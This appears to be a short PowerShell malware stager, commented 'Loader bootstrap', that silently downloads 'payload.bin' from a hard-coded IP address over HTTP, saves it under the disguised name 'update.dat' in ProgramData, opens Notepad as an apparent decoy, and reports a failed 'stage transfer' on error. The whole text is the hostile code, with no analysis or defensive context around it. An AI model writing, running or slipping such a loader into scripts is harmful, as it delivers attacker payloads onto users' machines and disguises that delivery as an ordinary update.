
<# Loader bootstrap #> try { $RemoteUrl = "http://198.51.100.96:80/downloads/payload.bin"; $LocalPath = 'C:\ProgramData\update.dat'; curl.exe -s -L -o $LocalPath $RemoteUrl; & 'notepad.exe'; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Stage transfer failed" }
